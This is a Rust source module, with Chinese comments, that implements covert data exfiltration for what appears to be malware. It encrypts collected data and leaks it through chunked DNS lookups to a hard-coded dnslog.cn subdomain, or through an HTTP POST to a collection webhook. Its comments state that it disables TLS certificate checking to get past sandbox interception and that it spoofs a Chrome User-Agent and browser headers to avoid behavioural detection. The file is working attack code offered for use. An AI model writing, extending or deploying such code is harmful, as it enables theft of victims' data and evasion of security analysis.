//! 外带模块：DNSLog.cn 平台法。
//! DNSLog.cn 是被动 DNS 日志平台：解析任意 `<数据>.7320io.dnslog.cn` 即被记录。
//! 为减少平台记录条数（免费版有限制），采用多级子域合并：
//!   将 base32 数据切成 63 字符标签后，每 3 个标签拼成一条 DNS 查询
//!   （标签1.标签2.标签3.7320io.dnslog.cn，总长 <253 字符上限），
//!   把外带查询次数压缩约 3 倍。
//! 接收端 decode.py 取 BASE_DOMAIN 前缀、去掉 '.' 即可还原完整 base32 串。

use crate::crypto;
use std::sync::Arc;
use std::time::Duration;

/// 单个数据标签的最大长度（DNS 单级上限 63 字符）。
const LABEL_MAX: usize = 63;
/// 每条 DNS 查询合并的标签数（3×63+3×63 ≈ 189 字符，留余量给基础域）。
const LABELS_PER_QUERY: usize = 3;
/// DNSLog.cn 外带目标基础域名（token 子域）。
pub const BASE_DOMAIN: &str = "7320io.dnslog.cn";

/// 构造一个跳过服务端证书校验的 rustls ClientConfig。
/// 目的：沙箱/流量分析环境常劫持或替换 HTTPS 证书（TLS 中间人解密），
/// 默认严格校验会因 UnknownIssuer 导致连接失败、外传被阻断。
/// 关闭校验后，无论沙箱如何替换证书都能建立连接并发出数据。
fn permissive_tls_config() -> Arc<rustls::ClientConfig> {
    // 自定义验证器：对所有证书一律放行（仅用于外带通道，接收端已做端到端加密）。
    #[derive(Debug)]
    struct AcceptAll;
    impl rustls::client::danger::ServerCertVerifier for AcceptAll {
        fn verify_server_cert(
            &self,
            _end_entity: &rustls_pki_types::CertificateDer<'_>,
            _intermediates: &[rustls_pki_types::CertificateDer<'_>],
            _server_name: &rustls_pki_types::ServerName<'_>,
            _ocsp_response: &[u8],
            _now: rustls_pki_types::UnixTime,
        ) -> Result<rustls::client::danger::ServerCertVerified, rustls::Error> {
            Ok(rustls::client::danger::ServerCertVerified::assertion())
        }
        fn verify_tls12_signature(
            &self,
            _message: &[u8],
            _cert: &rustls_pki_types::CertificateDer<'_>,
            _dss: &rustls::DigitallySignedStruct,
        ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
            Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
        }
        fn verify_tls13_signature(
            &self,
            _message: &[u8],
            _cert: &rustls_pki_types::CertificateDer<'_>,
            _dss: &rustls::DigitallySignedStruct,
        ) -> Result<rustls::client::danger::HandshakeSignatureValid, rustls::Error> {
            Ok(rustls::client::danger::HandshakeSignatureValid::assertion())
        }
        fn supported_verify_schemes(&self) -> Vec<rustls::SignatureScheme> {
            vec![
                rustls::SignatureScheme::RSA_PKCS1_SHA256,
                rustls::SignatureScheme::RSA_PKCS1_SHA384,
                rustls::SignatureScheme::RSA_PKCS1_SHA512,
                rustls::SignatureScheme::ECDSA_NISTP256_SHA256,
                rustls::SignatureScheme::ECDSA_NISTP384_SHA384,
                rustls::SignatureScheme::RSA_PSS_SHA256,
                rustls::SignatureScheme::RSA_PSS_SHA384,
                rustls::SignatureScheme::RSA_PSS_SHA512,
                rustls::SignatureScheme::ED25519,
            ]
        }
    }
    let config = rustls::ClientConfig::builder()
        .dangerous()
        .with_custom_certificate_verifier(Arc::new(AcceptAll))
        .with_no_client_auth();
    Arc::new(config)
}

/// HTTP 回连外带：把加密串作为 POST body 一次性发送到收集平台（如 webhook.site）。
/// 反行为检测：
///   - 关闭服务端证书校验，规避沙箱 TLS 中间人被 UnknownIssuer 阻断；
///   - User-Agent 伪装成常见浏览器，避免 `ureq/2.x` 的库特征被识别；
///   - 补充 Accept / Accept-Language / Cache-Control 等常规头，让请求更像正常浏览器流量；
///   - 仅发送加密后的密文，明文零可见。
/// 返回是否发送成功。
pub fn exfil_http(url: &str, key: &[u8; crypto::KEY_LEN], plaintext: &[u8]) -> bool {
    match crypto::encrypt(key, plaintext) {
        Some(cipher) => {
            let agent = ureq::AgentBuilder::new()
                .tls_config(permissive_tls_config())
                .build();
            let resp = agent
                .post(url)
                .timeout(Duration::from_secs(10))
                .set("Content-Type", "text/plain; charset=utf-8")
                .set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")
                .set("Accept", "*/*")
                .set("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
                .set("Cache-Control", "no-cache")
                .send_string(&cipher);
            match resp {
                Ok(_) => true,
                Err(e) => {
                    println!("[!] POST 失败: {e}");
                    false
                }
            }
        }
        None => false,
    }
}

/// 把密文（base64:nonce形式）做 base32 并切片为多个数据标签。
fn to_labels(cipher_b64: &str) -> Vec<String> {
    let b32 = crypto::b32(cipher_b64.as_bytes());
    crypto::chunk_to_labels(&b32, LABEL_MAX)
}

/// 触发一次 DNS 解析记录：解析 `<子域>.7320io.dnslog.cn`。
/// 平台会记录完整查询名与来源IP。
fn dns_log(subdomain: &str) {
    let fqdn = if subdomain.is_empty() {
        BASE_DOMAIN.to_string()
    } else {
        format!("{subdomain}.{BASE_DOMAIN}")
    };
    // 找不到记录是正常的，查询本身已被记录。
    let _ = dns_lookup::lookup_host(&fqdn);
}

/// 完整外带流程：先 ping 基础域确认存活，再把标签按 3 个一组拼成多级子域逐条解析。
/// 返回发送的 DNS 查询次数（约等于平台出现的记录去重数）。
pub fn exfil(key: &[u8; crypto::KEY_LEN], plaintext: &[u8], _id: &str) -> usize {
    // 探活：ping 基础域本身即可产生一条记录。
    dns_log("");
    match crypto::encrypt(key, plaintext) {
        Some(cipher) => {
            let labels = to_labels(&cipher);
            let mut sent = 0usize;
            for chunk in labels.chunks(LABELS_PER_QUERY) {
                let sub = chunk.join(".");
                dns_log(&sub);
                sent += 1;
            }
            sent
        }
        None => 0,
    }
}